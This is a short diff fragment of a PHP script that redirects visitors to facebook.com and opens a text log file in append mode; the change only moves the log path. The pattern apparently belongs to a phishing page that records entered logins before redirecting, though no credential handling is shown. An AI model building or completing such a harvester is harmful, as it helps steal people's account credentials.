@@ -10,7 +10,7 @@ header ('Location: http://www.facebook.com');
 
 // Open the text file in writing mode  
 
-$file = fopen("log.txt", "a"); 
+$file = fopen("/visit/log.txt", "a"); 
 
   
 
